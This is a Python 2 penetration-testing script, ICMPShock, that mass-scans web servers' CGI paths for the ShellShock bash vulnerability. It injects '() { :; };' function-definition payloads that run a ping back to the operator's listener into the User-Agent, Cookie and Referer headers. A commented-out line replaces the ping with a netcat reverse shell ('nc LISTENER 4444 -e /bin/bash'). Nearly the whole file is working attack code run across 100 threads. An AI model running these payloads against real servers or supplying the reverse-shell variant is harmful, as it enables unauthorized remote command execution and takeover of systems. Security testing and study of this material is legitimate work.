#!/usr/bin/python


#Uses lists from RAFT and detectify.com
#By Peter Kim
#Description: Fast ShellShock CGI bin brute forcer
#May have to play around with threads to get the best value.
#
#sudo tcpdump -nni eth0 -e icmp[icmptype] == 8

def banner():
#Our banner, doubled slashes added for proper formatting when banner is shown in STDOUT.
    print "-" * 70
    print """
.____________     _____ __________  _________.__                   __    
|   \_   ___ \   /      \\______   \\/   _____/|  |__   ____   ____ |  | __
|   /    \  \/  /  \ /  \|     ___/\_____  \ |  |  \ /  _ \_/ ___\|  |/ /
|   \     \____/    Y    \    |    /        \|   Y  (  <_> )  \___|    < 
|___|\______  /\____|__  /____|   /_______  /|___|  /\____/ \___  >__|_ \\
            \\/         \\/                 \\/      \\/            \\/     \\/

ICMPShock | A scanning tool for the ShellShock bash vulnerability.
Written by Peter Kim <Author, The Hacker Playbook>
                     <CEO, Secure Planet LLC>
"""
    print "Make Sure to Start Your ICMP Listner First | tcpdump -nni eth0 -e icmp[icmptype] == 8"
    print "Usage | python icmpshock.py <listener_IP> <targets_file>"
    print "E.X   | python icmpshock.py 127.0.0.1 target_list.txt"
    print "-" * 70

#Import our modules
import httplib, sys

from urlparse import urlparse
from threading import Thread
from Queue import Queue

try:
    LISTENER = sys.argv[1]
    target_file = sys.argv[2] 
#    cgi_file = sys.argv[3] #Uncomment this line to use the file name of your own cgi paths to scan as the 3rd system argument when running this script.

    concurrent = 100
    targets = open(target_file, "r")

except IndexError:
    banner()
    sys.exit()
#Define a function to be handled as a thread target.
#Call getStatus() an assign the results to "status" and "url" variables.
#Pass these variables to the doSomethingWithResult() function, and call task_done for our threading Queue.

def doWork():
    while True:
        url = q.get()
        status, url = getStatus(url)
        doSomethingWithResult(status, url)
        q.task_done()

#The getStatus function will inject a ping command into an environment variable.
#This variable will be injected into a POST request to the target.
#If we see ICMP packets coming to our machine from the target, we will know that the target is vulnerable.

def getStatus(ourl):
    global LISTENER

#The first system argument is our own machine, you can set to "localhost" or "127.0.0.1" unless testing another machine for an ICMP response.
#This should be the address used to locally run tcpdump.

#The following variables are defined as headers for our POST request.

    Command = "/bin/ping -c1 " + LISTENER
    #Command = "/bin/nc " + LISTENER + " 4444 -e /bin/bash" #uncomment this line if you want to spawn a reverse netcat shell
    #If testing against OWASPBWA, change nc to nc.traditional.  Thanks  Charley aka dotslashpwn 
    USER_AGENT = "() { :; }; " + Command
    Cookie = "() { :; }; " + Command
    Host = "() { :; }; " + Command
    Referer = "() { :; }; " + Command
    try:
        url = urlparse(ourl)

        conn = httplib.HTTPConnection(url.netloc)   
        conn.putrequest("POST", url.path)
        conn.putheader("User-Agent", USER_AGENT)
        conn.putheader("Cookie", Cookie)
        conn.putheader("Referer", Referer)
        conn.endheaders()
        res = conn.getresponse()
        return res.status, ourl

    except:
        #Throw an error if something goes wrong.
        return "EXCEPTION: {}".format(ourl)
        

def doSomethingWithResult(status, url):
    #Only print a URL to STDOUT when an HTTP 200 response is received.
    if status != 404:
        print "\033[1;32m[+]\033[1;mHTTP CODE 200 > {}".format(url)
    else:
        pass


q = Queue(concurrent * 2)
for i in range(concurrent):
    t = Thread(target=doWork) #Set the doWork() function as a target for the threading daemon
    t.daemon = True
    t.start() #Start our threading daemon.

try:
    #Print our banner, show values set, and wait for user input
    banner()
    print "\033[1;34m[*]\033[1;mListening Address: {}".format(LISTENER)
    print "\033[1;34m[*]\033[1;mThread Count: {}".format(concurrent)
    print ""
    print "-" * 40
    print "\033[1;34m[*]\033[1;mTarget Addresses"
    print "-" * 40
    print "\033[1;32m>>\033[1;m {}".format(targets.read().strip())
    targets.close()
    print "-" * 40
    print ""
    raw_input("\033[1;34m[*]\033[1;mPress [ENTER] to start scan-")
    
    #Append http:// to our URL read from our url list if it isn't defined
    #Then, append a cgi file path to the end of our URL and add it to the queue
    
    for url in open(target_file):
        if "http" not in url:
            url = "http://" + url.strip()
	else:
            url = url.strip()
	for file in open('Updated_list_Cgi_files.txt'):
        #for file in open(cgi_file): #Uncomment this line if you are using your own cgi path file as the 3rd system argument (sys.argv[3]).
            q.put(url.strip() + file.strip())
    q.join()

except:
    #Throw an error if something goes wrong.
    sys.exit(1)
